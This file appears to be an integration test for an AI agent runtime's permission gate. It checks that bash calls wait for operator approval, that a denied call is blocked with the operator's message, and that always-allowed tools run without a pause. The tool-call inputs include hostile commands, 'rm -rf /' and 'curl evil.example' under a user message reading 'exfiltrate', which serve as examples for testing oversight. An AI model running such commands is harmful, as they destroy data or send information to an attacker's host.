/**
 * R6.1 — the permission gate, end to end through the extension the session actually loads.
 *
 * `inbound-events.integration.test.ts` (R2.6) drives the runtime's coordinators directly.
 * That proves the turn driver, but NOT that the extension the session is built with is
 * wired to those coordinators with the right policy snapshot — the seam where a
 * "loaded but inert" gate would hide. So this test takes the `extensionFactories` off the
 * material the AgentSessionFactory RECEIVED, registers them exactly as Pi's loader does
 * (`factory(pi)` → `pi.on("tool_call", handler)`), and invokes the captured handler the
 * way Pi invokes it before running a tool.
 *
 * Asserted (§9.5, §22):
 *  - an `always_ask` tool blocks, and `session.status_idle` with
 *    `stopReason:"requires_action"` + `blockingEventIds:[toolCallId]` reaches a live
 *    SUBSCRIBER (the client's SSE stream), not just the runtime's internals;
 *  - `user.tool_confirmation(allow)` resolves the gate with "run it" and the turn settles
 *    `completed`;
 *  - `deny` blocks the tool with the operator's message;
 *  - an `always_allow` tool is never gated (no round trip, no pause).
 */

import { describe, it, expect } from "vitest";
import type {
  AgentConfig,
  Environment,
} from "@pi-managed/contracts";
import type {
  ExtensionAPI,
  ToolCallEvent,
  ToolCallEventResult,
} from "@earendil-works/pi-coding-agent";
import {
  FakeObjectStore,
  FakeSandboxProvider,
  FakeSecretStore,
  FakeUsageRecorder,
} from "@pi-managed/testkit";
import { ManagedSessionRuntime } from "../runtime.js";
import { InMemorySessionStore } from "../session-store.js";
import type {
  AgentSessionEventLike,
  AgentSessionFactory,
  AgentSessionLike,
  CreateAgentSessionOptions,
  SessionEntryLike,
  SessionRecord,
} from "../types.js";
import type { InboundEvent, OutboundEvent } from "../../ports.js";

// -- a fake AgentSession whose prompt() calls the gate, as Pi does -------------

type ToolCallHandler = (
  e: ToolCallEvent,
) => Promise<ToolCallEventResult | void> | ToolCallEventResult | void;

class GatedFakeSession implements AgentSessionLike {
  readonly sessionId = "fake-session";
  readonly sessionFile: string | undefined = undefined;
  isStreaming = false;
  promptImpl: (() => Promise<void>) | null = null;
  async prompt(): Promise<void> {
    if (this.promptImpl) await this.promptImpl();
  }
  async steer(): Promise<void> {}
  async followUp(): Promise<void> {}
  subscribe(_l: (e: AgentSessionEventLike) => void): () => void {
    return () => {};
  }
  async abort(): Promise<void> {}
  dispose(): void {}
  getEntries(): SessionEntryLike[] {
    return [];
  }
}

class GatedFactory implements AgentSessionFactory {
  last!: GatedFakeSession;
  material!: CreateAgentSessionOptions["material"];
  create(options: CreateAgentSessionOptions): Promise<AgentSessionLike> {
    this.material = options.material;
    this.last = new GatedFakeSession();
    return Promise.resolve(this.last);
  }
}

/**
 * Register the session's inline extensions the way Pi's resource loader does, and return
 * the `tool_call` handlers they installed. This is the production registration path — the
 * factories are the exact objects handed to `DefaultResourceLoader.extensionFactories`.
 */
function registerToolCallHandlers(
  material: CreateAgentSessionOptions["material"],
): ToolCallHandler[] {
  const handlers: ToolCallHandler[] = [];
  // A minimal ExtensionAPI: records `tool_call` subscriptions, no-ops everything else the
  // sibling managed extensions (tasks/goals/custom-tools/user_bash) call on it.
  const pi = new Proxy(
    {
      on: (event: string, handler: unknown) => {
        if (event === "tool_call") handlers.push(handler as ToolCallHandler);
      },
    } as Record<string, unknown>,
    {
      get(target, prop: string) {
        return target[prop] ?? (() => undefined);
      },
    },
  ) as unknown as ExtensionAPI;
  for (const factory of material.extensionFactories ?? []) {
    (factory as unknown as (api: ExtensionAPI) => void)(pi);
  }
  return handlers;
}

// -- helpers -----------------------------------------------------------------

function environment(): Environment {
  return {
    id: "env_gate",
    name: "gate-env",
    type: "cloud",
    status: "active",
    createdAt: "2026-07-14T00:00:00.000Z",
    updatedAt: "2026-07-14T00:00:00.000Z",
    image: "ubuntu:22.04",
    resources: { cpus: 1, memoryMiB: 512 },
    networking: { mode: "unrestricted" },
  };
}

/** `bash` is `always_ask`; every other built-in stays `always_allow` (§22.1/§22.2). */
function seededRecord(): SessionRecord {
  return {
    sessionId: "sess_gate",
    tenantId: "tnt_gate",
    localJsonlPath: "/tmp/pi-gate/sess_gate/log.jsonl",
    objectStoreKey: "sessions/sess_gate/log.jsonl",
    material: {
      agentConfig: {
        model: { provider: "anthropic", id: "claude-sonnet-4-5" },
        tools: {
          defaultConfig: { enabled: true, permissionPolicy: "always_allow" },
          configs: { bash: { enabled: true, permissionPolicy: "always_ask" } },
        },
      } as unknown as AgentConfig,
      providerKeys: { anthropic: "sk-test" },
      cwd: "/placeholder",
    },
    environment: environment(),
    vaultIds: [],
  };
}

function userMessage(content: string): InboundEvent {
  return {
    type: "user.message",
    id: `evt_${crypto.randomUUID()}`,
    createdAt: new Date().toISOString(),
    payload: { content },
  };
}

function confirmation(
  eventId: string,
  decision: "allow" | "deny",
  denyMessage?: string,
): InboundEvent {
  return {
    type: "user.tool_confirmation",
    id: `evt_${crypto.randomUUID()}`,
    createdAt: new Date().toISOString(),
    payload: { eventId, decision, ...(denyMessage ? { denyMessage } : {}) },
  };
}

function lastIdle(events: OutboundEvent[]) {
  const idle = [...events].reverse().find((e) => e.type === "session.status_idle");
  return idle?.payload as { stopReason?: string; blockingEventIds?: string[] } | undefined;
}

async function wake(): Promise<{
  runtime: ManagedSessionRuntime;
  factory: GatedFactory;
  /** Events as a live SSE client sees them. */
  events: OutboundEvent[];
  handlers: ToolCallHandler[];
}> {
  const sessions = new InMemorySessionStore();
  sessions.seed(seededRecord());
  const factory = new GatedFactory();
  const runtime = new ManagedSessionRuntime({
    sandbox: new FakeSandboxProvider(),
    objects: new FakeObjectStore(),
    usage: new FakeUsageRecorder(),
    secrets: new FakeSecretStore(),
    sessions,
    factory,
  });
  await runtime.wake("sess_gate");
  const events: OutboundEvent[] = [];
  void (async () => {
    for await (const e of runtime.subscribe()) events.push(e);
  })();
  return { runtime, factory, events, handlers: registerToolCallHandlers(factory.material) };
}

// -- tests -------------------------------------------------------------------

describe("permission gate round trip through the loaded extension (R6.1)", () => {
  it("always_ask tool → requires_action reaches the client → allow resumes the turn", async () => {
    const { runtime, factory, events, handlers } = await wake();
    expect(handlers.length).toBeGreaterThan(0);

    let gateResult: ToolCallEventResult | void | "pending" = "pending";
    factory.last.promptImpl = async () => {
      // Pi's pre-execution hook for the `bash` tool call.
      gateResult = await handlers[0]({
        toolCallId: "tc_bash_1",
        toolName: "bash",
        input: { cmd: "rm -rf /" },
      } as unknown as ToolCallEvent);
    };

    await runtime.sendEvent(userMessage("clean up"));

    // The tool is still blocked, and the CLIENT was told why + which event unblocks it.
    expect(gateResult).toBe("pending");
    expect(runtime.status()).toBe("idle");
    expect(lastIdle(events)).toEqual({
      stopReason: "requires_action",
      blockingEventIds: ["tc_bash_1"],
    });

    // The operator allows it → the gate returns "run the tool" (undefined) and the turn
    // settles.
    await runtime.sendEvent(confirmation("tc_bash_1", "allow"));
    expect(gateResult).toBeUndefined();
    expect(runtime.status()).toBe("idle");
    expect(lastIdle(events)?.stopReason).toBe("completed");

    runtime.dispose();
  });

  it("deny blocks the tool with the operator's message", async () => {
    const { runtime, factory, events, handlers } = await wake();

    let gateResult: ToolCallEventResult | void;
    factory.last.promptImpl = async () => {
      gateResult = await handlers[0]({
        toolCallId: "tc_bash_2",
        toolName: "bash",
        input: { cmd: "curl evil.example" },
      } as unknown as ToolCallEvent);
    };

    await runtime.sendEvent(userMessage("exfiltrate"));
    expect(lastIdle(events)?.stopReason).toBe("requires_action");

    await runtime.sendEvent(confirmation("tc_bash_2", "deny", "not on my watch"));
    expect(gateResult).toEqual({ block: true, reason: "not on my watch" });
    expect(lastIdle(events)?.stopReason).toBe("completed");

    runtime.dispose();
  });

  it("an always_allow tool is never gated", async () => {
    const { runtime, factory, events, handlers } = await wake();

    let gateResult: ToolCallEventResult | void = { block: true };
    factory.last.promptImpl = async () => {
      gateResult = await handlers[0]({
        toolCallId: "tc_read_1",
        toolName: "read",
        input: { path: "/workspace/README.md" },
      } as unknown as ToolCallEvent);
    };

    await runtime.sendEvent(userMessage("read the readme"));
    expect(gateResult).toBeUndefined(); // ran immediately — no confirmation asked
    expect(lastIdle(events)?.stopReason).toBe("completed");
    expect(lastIdle(events)?.blockingEventIds).toBeUndefined();

    runtime.dispose();
  });
});
